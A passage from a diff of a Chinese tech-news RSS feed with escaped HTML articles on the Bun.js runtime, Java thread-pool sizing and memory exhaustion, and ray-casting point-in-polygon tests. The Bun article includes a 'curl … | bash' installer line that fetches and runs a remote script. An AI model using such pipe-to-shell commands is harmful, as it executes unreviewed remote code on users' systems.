函数(&lt;code&gt;fs、path、Buffer&lt;/code&gt; 等)。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;Bun.js&lt;/code&gt; 的目标是可以在浏览器之外的其他地方运行世界上大多数 &lt;code&gt;JavaScript&lt;/code&gt;，为你未来的基础架构带来性能和复杂性的增强，并通过更好、更简单的工具提高开发者的生产力！&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;性能表现如何？&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;服务端渲染：每秒处理 &lt;code&gt;HTTP&lt;/code&gt; 请求数&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.757847533632287&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPEtp9nKBwGDvbSbZrN5r9cs8VOeMwrxpe7Pp9e1E74iaCuR9f9mSI3Og/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;892&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;加载一个巨大的 &lt;code&gt;sqlite&lt;/code&gt; 表：每秒平均查询次数&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8521303258145363&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPOCfj1Odne3EEtl4OQic64q4icsn86sG6EUPye1XrtMrwnPpjI1zQsW6w/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;798&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;FFI&lt;/code&gt;：每秒操作数&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.6756198347107438&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPJzU9j6oP9cpfoNP8kNBnIt4SUyTkia3mnByXJ1RlpBNxW5jOX6mPvVw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;968&quot;/&gt;&lt;/figure&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;为啥这么快？&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;和 &lt;code&gt;Node.js、Deno&lt;/code&gt; 不同，&lt;code&gt;Bun.js&lt;/code&gt; 并没有基于 &lt;code&gt;V8&lt;/code&gt; 引擎，它直接选择了 &lt;code&gt;JavaScriptCore&lt;/code&gt; 引擎，它的执行速度往往要比 &lt;code&gt;V8&lt;/code&gt; 等更传统引擎要快。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.47533206831119545&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPomjx5CwcqDW4kHD3a4H1nGEEnsscceTQFy0owwzvZpHib0OIsficS1NQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2108&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;另外，&lt;code&gt;Bun.js&lt;/code&gt; 是用一种具有手动内存管理的低级编程语言 &lt;code&gt;ZIG&lt;/code&gt; 编写的，对内存的低级控制、没有隐藏的控制流可能就是它性能非常好的秘诀。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.4699812382739212&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPRDTQNV5qFgOE5QLjcomwDMDRRGUIUL07H3UFujosaFyloXOLmlsXow/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2132&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;Bun.js&lt;/code&gt; 的大部分内容都是完全从零开始编写的，包括 &lt;code&gt;JSX/TypeScript&lt;/code&gt; 转译器、&lt;code&gt;npm&lt;/code&gt; 客户端、打包器、&lt;code&gt;SQLite&lt;/code&gt; 客户端、&lt;code&gt;HTTP&lt;/code&gt; 客户端、&lt;code&gt;WebSocket&lt;/code&gt; 客户端等等。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;有哪些能力？&lt;/span&gt;&lt;/h2&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;Web API&lt;/code&gt;：对 &lt;code&gt;fetch、WebSocket、 ReadableStream&lt;/code&gt; 等 &lt;code&gt;API&lt;/code&gt; 都提供了内置支持&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;Node.js&lt;/code&gt; 模块：&lt;code&gt;Bun&lt;/code&gt; 实现了 &lt;code&gt;Node.js&lt;/code&gt; 的模块解析算法，同时支持 &lt;code&gt;ESM&lt;/code&gt; 和 &lt;code&gt;CommonJS&lt;/code&gt;，但 &lt;code&gt;Bun&lt;/code&gt; 内部使用 &lt;code&gt;ESM&lt;/code&gt;。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;支持转译大量文件类型，你可以直接运行 &lt;code&gt;TypeScript、JSX&lt;/code&gt;，甚至支持各种 &lt;code&gt;tsconfig.json&lt;/code&gt; 中的配置。&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;1.230958230958231&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPNCDXGXPvlE7YLZE1ibQtwdnAUSb4e9yzFnyPLN4MicGjIiaunic94s4AIg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;814&quot;/&gt;&lt;/figure&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;Bun.write&lt;/code&gt; 使用最快的系统调用，实现写入、复制、管道、发送和克隆文件。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;自动加载环境变量 &lt;code&gt;.env&lt;/code&gt; 文件，不需要再 &lt;code&gt;require(&quot;dotenv&quot;).load()&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;附带一个内置的快速 &lt;code&gt;SQLite3&lt;/code&gt; 客户端 &lt;code&gt;bun:sqlite&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;Bun.js&lt;/code&gt; 实现了大部分 &lt;code&gt;Node-API&lt;/code&gt; (&lt;code&gt;N-API&lt;/code&gt;)，大部分 &lt;code&gt;Node.js&lt;/code&gt; 原生模块都可以正常工作。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;bun:ffi&lt;/code&gt; 可以使用低成本的外部函数接口从 &lt;code&gt;JavaScript&lt;/code&gt; 调用本机代码(据测试比 &lt;code&gt;napi&lt;/code&gt; 快 5 倍 、比 &lt;code&gt;Deno&lt;/code&gt; 快 &lt;code&gt;100&lt;/code&gt; 倍)&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.9185059422750425&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPtN0PXk9yiayxHqaqOXmvuc1dKsd7ER2yctr6vIGG9LjoicSlJ6vLqibxQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1178&quot;/&gt;&lt;/figure&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;原生支持不断增长的 &lt;code&gt;Node.js&lt;/code&gt; 核心模块列表以及全局变量，例如 &lt;code&gt;Buffer&lt;/code&gt; 和 &lt;code&gt;process&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;试用一下&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;安装 &lt;code&gt;Bun CLI&lt;/code&gt;：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;curl https://bun.sh/install | bash&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;Bun&lt;/code&gt; 的 &lt;code&gt;HTTP&lt;/code&gt; 服务器基于 &lt;code&gt;Request&lt;/code&gt; 和 &lt;code&gt;Response&lt;/code&gt; 等 &lt;code&gt;Web&lt;/code&gt; 标准构建：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;// http.js&lt;/span&gt;&lt;br/&gt;&lt;span&gt;export&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; {&lt;br/&gt;  &lt;span&gt;port&lt;/span&gt;: &lt;span&gt;3000&lt;/span&gt;,&lt;br/&gt;  fetch(request) {&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Response(&lt;span&gt;&quot;Hi, ConardLi！Welcome to Bun!&quot;&lt;/span&gt;);&lt;br/&gt;  },&lt;br/&gt;};&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;用 &lt;code&gt;bun&lt;/code&gt; 运行它：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;bun run http.js&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;然后在浏览器中打开 &lt;code&gt;http://localhost:3000&lt;/code&gt;。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;查看更多示例：https://github.com/Jarred-Sumner/bun/tree/main/examples&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;查看官方文档：https://github.com/Jarred-Sumner/bun#Reference&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;CLI 命令：&lt;code&gt;bun run&lt;/code&gt;：可以直接运行 &lt;code&gt;JavaScript&lt;/code&gt; 和 &lt;code&gt;TypeScript&lt;/code&gt; 文件以及 &lt;code&gt;package.json&lt;/code&gt; 中的 &lt;code&gt;scripts&lt;/code&gt; 脚本。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;根据测试，&lt;code&gt;bun&lt;/code&gt; 运行 &lt;code&gt;package.json&lt;/code&gt; 脚本比 &lt;code&gt;npm&lt;/code&gt; 运行 &lt;code&gt;package.json&lt;/code&gt; 脚本快 30 倍。&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;CLI 命令：&lt;code&gt;bun install&lt;/code&gt;：兼容 &lt;code&gt;npm&lt;/code&gt; 的包管理器，使用最快的系统调用来复制文件。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.4283854166666667&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPYneMEiajERgpAfFSuw0NheAYBia9W8gE6qPvls5GMdgy9ibNQAw5WLkYA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1536&quot;/&gt;&lt;/figure&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;根据测试，bun 比 npm 的包安装速度快 20 倍。&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;CLI 命令：&lt;code&gt;bun wiptest&lt;/code&gt;：一个类似于 &lt;code&gt;Jest&lt;/code&gt; 的测试运行器，用于内置到 &lt;code&gt;bun&lt;/code&gt; 的 &lt;code&gt;JavaScript&lt;/code&gt; 和 &lt;code&gt;TypeScript&lt;/code&gt; 项目。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Bun 目前还处于 beta 阶段，距离生产环节还有一段路要走，大家觉得它的未来究竟如何呢？&lt;/p&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;Mzg5NDEyMzA2NQ==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/iccXN8sGPLT448GlibKCW2RVGEL14qHxzyyponoibrYxCtZSMy8ulr2PNGcdcticP1Z3OnZWFiaWTsVgpeT8COOCgVA/0?wx_fmt=png&quot; data-nickname=&quot;小生方勤&quot; data-alias=&quot;XSFQ_HSD&quot; data-signature=&quot;这里是前端人的一片栖息之地，愿你在这里可以解开迷惑，收获喜悦。&quot; data-from=&quot;0&quot;/&gt;&lt;strong/&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;在看点这里⬇️⬇️⬇️&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;
+            &lt;section data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.69&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/Z85sZvtmju13RJgyiaBJtf4u0JJn7fthqw8M68UfJ3FmKgFMjmgetkOsFZXG5lF6iayYrW0IC9764XNAew3Dn37g/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;500&quot;/&gt;&lt;/section&gt;&lt;section draggable=&quot;false&quot; data-tools-id=&quot;77768&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;事先声明&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;题目并没有哗众取宠的意思，我确实有在用&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;创建线程池。本文也不会赘述有关线程池参数，线程状态等概念。&lt;/span&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;尽管我知道阿里规约手动创建线程池背后的深意，通过ThreadPoolExecutor创建线程池可以让使用者更加明确线程池的运行规则，规避资源耗尽的风险。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;资源耗尽的风险&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;资源耗尽的风险主要还是源于内存：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool和&lt;span&gt;Executors&lt;/span&gt;.&lt;span&gt;newSingleThreadExecutor&lt;/span&gt;创建的线程池，等待队列默认值是&lt;/span&gt;&lt;span&gt;Integer.MAX_VALUE，基本等同于无&lt;/span&gt;&lt;span&gt;界&lt;/span&gt;&lt;span&gt;的队列。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;毋庸置疑，线程数肯定是有限的，尤其对于密集计算型任务，线程数设置太大只会徒增线程消耗，并不会提高任务执行效率。&lt;/span&gt;&lt;span&gt;如果请求量过大，大量的请求数据堆积在队列中，极有可能发生OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、使用&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newCachedThreadPool&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;&lt;span&gt;创建的线程池，最大线程数是&lt;/span&gt;Integer.MAX_VALUE&lt;span&gt;，&lt;/span&gt;&lt;/span&gt;&lt;span&gt;基本等同于无限大。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对于大量的请求，无限的创建线程，&lt;/span&gt;&lt;span&gt;ThreadStackSize按1024k算，极有可能发生OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;为什么我使用&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;创建线程池&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;原因有两个：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、不喜欢各类的条条框框，Java包括Java生态圈本身已经有很多规约了，还需要阿里再来一套规约？&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、Java既然自带了这样的线程池工具，应该有用武之地。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我个人看来，使用&lt;span&gt;Executors&lt;/span&gt;和直接使用&lt;span&gt;ThreadPoolExecutor&lt;/span&gt;并没有本质区别，更多的关注还应该放在任务本身。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;假设使用&lt;span&gt;Executors&lt;/span&gt;创建的线程池会出现OOM，那么采用&lt;span&gt;ThreadPoolExecutor&lt;/span&gt;就能规避吗？答案大概率是否定的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;几点使用线程池的考虑&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;我通常会先考虑以下几点：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任务偏IO还是偏计算&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、通常程序线程池用来处理小而多批量任务&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、线程数量和CPU核数相呼应&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;4、请求量多少和请求量大小&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;5、定时监控线程池当前运行状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;6、线程数量可以动态设置&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;7、适当的控制线程数&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;8、任务耗时的话尽量去拆分或优化&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;场景假设&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;先来看个场景，假设A会持续向B推送数据，量级为1亿，payload为100B；B收到数据后进行应答后，A会继续向B推送；为了A不影响数据推送，&lt;/span&gt;&lt;span&gt;B会直接应答，然后线程池异步处理A推送来的数据。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;可能假设场景有些鸡肋，但现实也不乏这种场景，将就着看吧。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;假设使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool创建线程数为10的线程池，单个线程执行一次任务耗时10ms，想想看，5min中后，&lt;/span&gt;&lt;span&gt;线程池处理了10*100*300个任务，忽略线程切换带来的损耗，累计处理30w个任务。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;剩下还有约1亿的数据堆积到了队列中。&lt;/span&gt;&lt;span&gt;100B*100000000/1024，大约9g的数据，绝对&lt;/span&gt;&lt;span&gt;OOM了。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;问题的根本原因&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;那问题来了，使用&lt;span&gt;ThreadPoolExecutor的话&lt;/span&gt;我应该开多少个线程？队列应该设置多大？数据来了线程满了，队列满了，直接丢弃数据？还是业务线程本身继续执行？&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这个时候线程基本已经忙不过来了，CPU狂飙，内存OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;分析现状解决问题&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;显然这个时候需要把速度降下来，而不是无脑提交到线程池中。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我们对照上面几点重新优化下这个程序流程：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任务是偏计算型的，4核开10个线程还算合理，可以动态设置线程数再进行调试&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、请求量总大小大约10g，对于8g内存的应用，考虑占用1g内存，大约10000个任务数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、使用&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;定时监控线程池的状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;针对上面的无脑分析&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、我们使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool和&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;，前者用来执行任务，后者用来定时输出线程池状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、B端协商A端，每次推送1000个数据，10个线程处理10000个，使用信号量严格控制，数据不进队列；&lt;/span&gt;&lt;span&gt;亦或使用信号量控制，队列至多进入10000个数据；&lt;/span&gt;&lt;span&gt;信号量大小为10000+线程数&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、动态设置线程池最大线程数，定时监控线程池状态，没什么神奇，线程池提供了这样的方法&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;总结&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;以上就是本文所要阐述的观点，主要想表达以下几点：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任何规约不要盲从&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、尽可能多地关注自己的业务数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、合理利用线程池&lt;/span&gt;&lt;/p&gt;
           &lt;/div&gt;
 
           
@@ -38,155 +19,582 @@
 
 
            
-                                
-                    
-        &lt;/div&gt;&lt;/div&gt;</content:encoded>
+                          
+              &lt;/div&gt;&lt;/div&gt;</content:encoded>
 </item>
 <item>
-<guid>333168480903713e5979d4595257cd5d</guid>
-<title>一种快速判断点在多边形内的算法 - sunsky303 - 博客园</title>
-<link>https://toutiao.io/k/tk72sfy</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div id=&quot;cnblogs_post_body&quot; class=&quot;blogpost-body blogpost-body-html&quot;&gt;
-&lt;p&gt;由于业务需要， 我总结了一种快速判断点在多边形内的算法。&lt;/p&gt;
-&lt;h2&gt;先说思路：&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2022.cnblogs.com/blog/420532/202207/420532-20220711214724789-515700249.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;如图：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;如果点在多边形内部，射线第一次穿越边界一定是穿出多边形。&lt;/li&gt;
-&lt;li&gt;如果点在多边形外部，射线第一次穿越边界一定是进入多边形。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;我们可以归纳出：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;ul&gt;
-&lt;li&gt;当射线穿越多边形边界的次数为偶数时，所有第偶数次（包括最后一次）穿越都是穿出，因此所有第奇数次（包括第一次）穿越为穿入，由此可推断点在多边形外部。&lt;/li&gt;
-&lt;li&gt;当射线穿越多边形边界的次数为奇数时，所有第奇数次（包括第一次和最后一次）穿越都是穿出，由此可推断点在多边形内部。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h2&gt;实现关键点&lt;/h2&gt;
-&lt;h3&gt;1. 点在多边形的边上&lt;/h3&gt;
-&lt;p&gt;前面我们讲到，射线法的主要思路就是计算射线穿越多边形边界的次数。那么对于点在多边形的边上这种特殊情况，射线出发的这一次，是否应该算作穿越呢？&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2022.cnblogs.com/blog/420532/202207/420532-20220711215309565-59031607.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;思路： 先求边和点的交点， 即边的起点y乘以边斜率，得到交点的x， 若x == X， X是参考点的横坐标，则点在线上。&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;2. 点和多边形的顶点重合&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2022.cnblogs.com/blog/420532/202207/420532-20220711215813678-1744237223.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;思路：参考点与边顶点重合，则直接是 x == X &amp;amp;&amp;amp; y == Y ，其中x,y是边顶点， X,Y是参考点， 则直接返回。&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;3. 射线经过多边形顶点&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2022.cnblogs.com/blog/420532/202207/420532-20220711220539385-1514772224.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;思路：这时相交点次数无论内外都是偶数次，无法判断。不过，这里看射线两侧的边如果都在两侧时算作一次“穿过”，即 y == Y时， x1 &amp;gt; X 并且 x2 &amp;lt;= X (或  x1 &amp;lt; X 且 x2 &amp;gt; X），穿过数次加1 , 其中X，Y是参考点， x1,y1 ,  x2, y2是线段顶点。&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3&gt;4. 射线刚好经过一条边&lt;/h3&gt;
